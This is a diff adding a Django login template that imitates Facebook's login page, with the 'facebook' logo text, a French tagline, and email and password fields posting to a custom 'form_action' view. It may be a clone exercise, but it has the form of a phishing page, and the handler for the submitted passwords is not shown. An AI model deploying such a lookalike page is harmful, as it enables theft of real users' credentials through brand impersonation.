@@ -1,0 +1,42 @@
+<!-- myapp/templates/myapp/login.html -->
+
+{% load static %}
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'myapp/style.css' %}">
+</head>
+<body>
+    <div class='bigContainer'>
+        <div class="container">
+            <div class="RandomInfos">
+                <h2 class="logo">facebook</h2>
+                <p>Avec Facebook, partagez et restez en contact avec votre entourage.</p>
+            </div>
+            <div class="loginForm">
+                <!-- <form method="POST"  {% csrf_token %} action="{% url 'login' %}" class="form">
+                    <input name="username" type="email" placeholder="Adresse email ou numéro de Tel" />
+                    <input name="password" type="password" placeholder="mot de passe" />
+                    <button type="submit" value="submit" class="button">Se connecter</button>
+                    <a href="">mot de passe oublié</a>
+                    <button type="submit" class="button2">Créer nouveau compte</button>
+                </form> -->
+                <form method="POST" action="{% url 'form_action' %}" class="form">
+                    {% csrf_token %}
+                    <input name="username" type="email" placeholder="Adresse email ou numéro de Tel" />
+                    <input name="password" type="password" placeholder="mot de passe" />
+                    <button type="submit" class="button">Se connecter</button>
+                    <a href="">mot de passe oublié</a>
+                    <button type="submit" class="button2">Créer un nouveau compte</button>
+                </form>
+                
+            </div>
+        </div>
+    </div>
+</body>
+</html>
